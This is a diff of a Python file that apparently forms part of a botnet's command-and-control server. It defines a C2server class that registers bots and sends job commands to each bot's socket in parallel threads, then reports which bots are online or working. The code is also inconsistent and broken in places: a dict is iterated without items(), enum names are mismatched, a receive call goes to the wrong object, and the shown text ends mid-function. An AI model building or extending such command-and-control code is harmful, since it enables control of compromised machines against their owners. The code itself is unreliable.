@@ -1,65 +1,60 @@
 import threading
-import concurrent.futures
+import socket
+
+import c2_pb2
 
 from botnet_exceptions import *
 
 
 class C2server():
 
-    def __init__(self, user_id, bot):
+    def __init__(self, user_id, bot=None):
         self.user_id = user_id
-        self.bots = {bot.address[0]: bot}
-        self.event_state = threading.Event()
+        self.bots = {bot.address[0]: bot} if bot else {}
+
+    def add_bot(self, bot):
+        self.bots[bot.address[0]] = bot
 
     def start_job(self, command_id):
-        if not self.are_bots_online():
-            raise NoBotsException()
+        response = c2_pb2.StartJobResponse()
+        response.response = c2_pb2.StartJobResponse.Response.FAIL
 
-        for bot in self.bots:
-
-
-
-    def are_bots_online(self):
-        if not self.bots:
-            return False
-        online_bots = 0
-        for bot_address, bot in self.bots.items():
-            if self.is_socket_alive(bot.bot_socket):
-                online_bots += 1
-        if online_bots == 0:
-            return False
-        return True
-    
-    def execute_command(self, command):
-        """
-        Command botnet to execute command
-        :param command: Command
-        :return: bool
-        """
         if not self.bots:
             raise NoBotsException()
 
-        """
-        with concurrent.futures.ProcessPoolExecutor() as executor:
-            futures = [executor.submit(self.command_bot, bot) for bot in self.bots]
-        results = [f.result() for f in futures]
-        """
-
-        threads = [threading.Thread(self.command_bot, args=(command, bot)) for bot in self.bot_list]
+        threads = [threading.Thread(self.command_bot, args=(command_id, bot)) for bot_address, bot in self.bots]
 
         for thread in threads:
             thread.start()
 
+        for thread in threads:
+            thread.join()
+        
+        online_bots = 0
+        for bot_address, bot in self.bots.items():
+            return_bot = response.bots.add()
+            return_bot.userId = bot.user_id
+            return_bot.state = bot.state
+            return_bot.address = bot_address
 
-    def command_bot(self, command, bot):
-        if not self.check_connection(bot):
-            return "Dead bot"
+            if bot.state == c2_pb2.Bot.STATE.OFFLINE:
+                continue
+            online_bots += 1
 
-        bot.sendall(str(command.commandId).encode())
+        if online_bots:
+            response.response = c2_pb2.StartJobResponse.Response.SUCCESS
+
+        return response
+
+
+    def command_bot(self, command_id, bot):
+        if not self.check_connection(bot.bot_socket):
+            bot.state = c2_pb2.Bot.State.OFFLINE
+            return
+
+        bot.bot_socket.sendall(str(command_id).encode())
         if bot.recv(1024).decode() == "Started":
-            command.command_socket.sendall(b"Started")
-
-        self.event_state.wait()
+            bot.state = c2_pb2.Bot.State.WORKING
 
     def is_socket_alive(self, sock):
         try:
